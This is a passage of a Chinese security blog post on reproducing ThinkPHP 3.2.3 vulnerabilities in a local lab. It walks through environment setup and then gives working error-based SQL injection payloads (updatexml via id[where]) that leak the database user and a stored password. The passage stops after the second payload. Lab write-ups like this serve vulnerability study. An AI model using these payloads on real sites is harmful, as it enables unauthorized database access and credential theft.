@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="趁热打铁，把ThinkPHP3的相关漏洞都复现一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP3漏洞探索">
+<meta property="og:url" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="趁热打铁，把ThinkPHP3的相关漏洞都复现一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723165905216.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240618225035184.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719120429200.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719120752776.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719120855607.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719121126120.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719122604719.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720220721922.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719150715147.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719181856182.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719182045155.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720221132344.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719182848287.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720221231919.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720121516617.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720122746298.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720234336827.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720172553098.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720172744907.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720174258722.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720222322968.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720185500361.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720185656917.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720225211676.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720235811333.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720235602341.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721113425380.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721120815180.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721121007358.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721121627878.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721121946944.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721142227954.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143536019.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143648643.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143740667.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143844490.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143950540.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721150702864.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721151143041.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721151959256.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722120123884.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722120651798.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722120921487.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722121753096.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722121845772.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722122234386.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722122514332.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722122603240.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722142136358.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722125349581.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722125515834.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722144530409.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722123631954.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723180359882.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722185426755.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723121155030.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723122038853.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723172640856.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723173023706.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723173314682.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723174306991.png">
+<meta property="article:published_time" content="2024-07-23T03:58:06.000Z">
+<meta property="article:modified_time" content="2024-07-23T10:22:58.963Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="ThinkPHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723165905216.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ThinkPHP3漏洞探索 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP3漏洞探索
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-07-23 11:58:06 / 修改时间：18:22:58" itemprop="dateCreated datePublished" datetime="2024-07-23T11:58:06+08:00">2024-07-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html" class="post-meta-item leancloud_visitors" data-flag-title="ThinkPHP3漏洞探索" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>趁热打铁，把ThinkPHP3的相关漏洞都复现一下</p>
+<span id="more"></span>
+
+<h1 id="ThinkPHP3"><a href="#ThinkPHP3" class="headerlink" title="ThinkPHP3"></a>ThinkPHP3</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>PHP5.5.9+ThinkPHP3.2.3</p>
+</blockquote>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>源码下载链接：<a target="_blank" rel="noopener" href="http://m.lxywzjs.com/wap/article/index/artid/199.html">http://m.lxywzjs.com/wap/article/index/artid/199.html</a></p>
+<p>打开phpstudy，新建一个网站</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723165905216.png"></p>
+<p>将源码文件解压放到thinkphp3的文件夹内即可</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>像方法一那样打开phpstudy，新建一个网站</p>
+<p>创建好网站后先下载下composer工具，可以从<code>软件管理 =&gt; composer</code>处下载</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240618225035184.png"></p>
+<p>下载好后在管理打开composer</p>
+<p>选择php版本为大于5.3的</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719120429200.png"></p>
+<p>然后执行命令安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/thinkphp:v3.2.3 tp3</span><br></pre></td></tr></table></figure>
+
+<p>安装成功后将tp3文件夹内的所有文件移到根目录<code>thinkphp3</code>下</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719120752776.png"></p>
+<p>最后在刚刚执行composer命令的终端更新一下即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719120855607.png"></p>
+<p>访问<code>./index.php</code>出现以下界面，说明环境搭建成功</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719121126120.png"></p>
+<h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>配置文件位置<code>ThinkPHP/Conf/convention.php</code></p>
+<p>参数配置如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line">return array(</span><br><span class="line"> 	...</span><br><span class="line">    /* 数据库设置 */</span><br><span class="line">    &#x27;DB_TYPE&#x27;                =&gt; &#x27;mysql&#x27;, // 数据库类型</span><br><span class="line">    &#x27;DB_HOST&#x27;                =&gt; &#x27;127.0.0.1&#x27;, // 服务器地址</span><br><span class="line">    &#x27;DB_NAME&#x27;                =&gt; &#x27;thinkphp3&#x27;, // 数据库名</span><br><span class="line">    &#x27;DB_USER&#x27;                =&gt; &#x27;rev1ve&#x27;, // 用户名</span><br><span class="line">    &#x27;DB_PWD&#x27;                 =&gt; &#x27;rev1ve&#x27;, // 密码</span><br><span class="line">    &#x27;DB_PORT&#x27;                =&gt; &#x27;3306&#x27;, // 端口</span><br><span class="line">    &#x27;DB_PREFIX&#x27;              =&gt; &#x27;think_&#x27;, // 数据库表前缀</span><br><span class="line">    &#x27;DB_PARAMS&#x27;              =&gt; array(), // 数据库连接参数</span><br><span class="line">    &#x27;DB_DEBUG&#x27;               =&gt; false, // 数据库调试模式 开启后可以记录SQL日志</span><br><span class="line">    &#x27;DB_FIELDS_CACHE&#x27;        =&gt; true, // 启用字段缓存</span><br><span class="line">    &#x27;DB_CHARSET&#x27;             =&gt; &#x27;utf8&#x27;, // 数据库编码默认采用utf8</span><br><span class="line">    &#x27;DB_DEPLOY_TYPE&#x27;         =&gt; 0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span><br><span class="line">    &#x27;DB_RW_SEPARATE&#x27;         =&gt; false, // 数据库读写是否分离 主从式有效</span><br><span class="line">    &#x27;DB_MASTER_NUM&#x27;          =&gt; 1, // 读写分离后 主服务器数量</span><br><span class="line">    &#x27;DB_SLAVE_NO&#x27;            =&gt; &#x27;&#x27;, // 指定从服务器序号</span><br><span class="line">	...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>在thinkphp3下载一个管理工具phpMyAdmin，绑定thinkphp3网站</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719122604719.png"></p>
+<p>创建thinkphp3数据库，登录phpMyAdmin</p>
+<p>创建表的字段如下（注意数据表前缀和配置文件相同）</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720220721922.png"></p>
+<hr>
+<h2 id="ThinkPHP3-2-3-where注入漏洞"><a href="#ThinkPHP3-2-3-where注入漏洞" class="headerlink" title="ThinkPHP3.2.3 where注入漏洞"></a>ThinkPHP3.2.3 where注入漏洞</h2><p>入口文件：<code>Application/Home/Controller/IndexController.class.php</code></p>
+<p>修改一下<code>index()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function index()&#123;</span><br><span class="line">	$id=I(&#x27;GET.id&#x27;);</span><br><span class="line">    $data = M(&#x27;user&#x27;)-&gt;find($id);</span><br><span class="line">    var_dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>结合报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]=1 and 1=updatexml(1,concat(0x7e,user(),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>执行POC，通过报错得到user</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719150715147.png"></p>
+<p>如果要执行查询表，注意表名是带前缀的<code>think_user</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from think_user limit 1),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+
+
